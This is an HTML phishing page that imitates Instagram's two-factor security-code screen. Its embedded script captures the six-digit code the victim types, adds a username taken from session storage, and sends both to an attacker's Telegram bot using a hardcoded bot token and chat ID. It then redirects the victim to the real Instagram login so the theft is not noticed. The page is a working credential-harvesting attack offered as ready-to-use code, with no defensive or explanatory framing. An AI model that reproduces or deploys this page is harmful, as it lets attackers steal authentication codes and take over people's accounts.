<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Code - Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #121212; color: #ffffff; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 60px; }
        .container { width: 100%; max-width: 350px; padding: 0 20px; text-align: center; }
        .logo { width: 80px; height: 80px; margin-bottom: 30px; }
        h2 { font-size: 18px; font-weight: 600; color: #fff; margin-bottom: 10px; }
        p { font-size: 14px; color: #b0b0b0; line-height: 1.4; margin-bottom: 20px; }
        input { width: 100%; padding: 16px 14px; background-color: transparent; border: 1px solid #363636; border-radius: 14px; font-size: 16px; text-align: center; letter-spacing: 4px; margin-bottom: 15px; outline: none; color: #fff;}
        .btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 14px; padding: 14px 16px; font-weight: 600; font-size: 16px; cursor: pointer; }
        .btn:disabled { background-color: #1a4e7a; cursor: default; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzUgMTc1Ij48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImciIHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZmQ2MDAiLz48c3RvcCBvZmZzZXQ9IjUwJSIgc3RvcC1jb2xvcj0iI2ZmMDAwMCIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI2QzMDBjNSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGZpbGw9InVybCgjZykiIGQ9Ik0xMjIgNTJ2MjBIMzB2MjBoMjB2MjBINzB2MjBoMjB2LTIwSDEyMFY4MmgxNlY2MmgxNlY0MmgxNnYyMHptLTIgNjBIMzB2MjBoNjB2LTIweiIvPjwvc3ZnPg==" alt="Instagram">
        <h2>Enter security code</h2>
        <p>We sent a code to your email. Enter it below to continue.</p>
        <form id="2faForm">
            <input type="text" id="code" placeholder="------" maxlength="6" required>
            <button type="submit" class="btn" id="submitBtn">Confirm</button>
        </form>
    </div>
    <script>
        document.getElementById('2faForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = document.getElementById('code').value.trim();
            if (code.length < 6) return;

            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
            const CHAT_ID = "2005892579";
            const username = sessionStorage.getItem('insta_user') || 'Unknown';
            
            const message = `🔐 *INSTAGRAM 2FA CODE!*\n👤 User: \`${username}\`\n🔢 Code: \`${code}\``;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            }).then(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }).catch(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        });
    </script>
